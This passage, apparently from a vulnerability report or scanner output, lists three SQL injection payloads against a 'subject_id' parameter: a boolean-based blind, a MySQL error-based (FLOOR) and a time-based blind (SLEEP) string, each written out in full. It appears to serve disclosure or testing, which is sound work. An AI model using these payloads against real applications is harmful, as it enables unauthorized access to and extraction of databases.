...
- **Type:** boolean-based blind
  ...
  - **Payload:** `subject_id=1' RLIKE (SELECT (CASE WHEN (1139=1139) THEN 1 ELSE 0x28 END)) AND 'APOl'='APOl`
- **Type:** error-based
  - **Title:** MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
  - **Payload:** 
```
subject_id=1' AND (SELECT 6437 FROM(SELECT COUNT(*),CONCAT(0x71706b6a71,(SELECT (ELT(6437=6437,1))),0x7171717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ovSp'='ovSp
```
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `subject_id=1' AND (SELECT 7006 FROM (SELECT(SLEEP(5)))UWgC) AND 'zjcu'='zjcu`
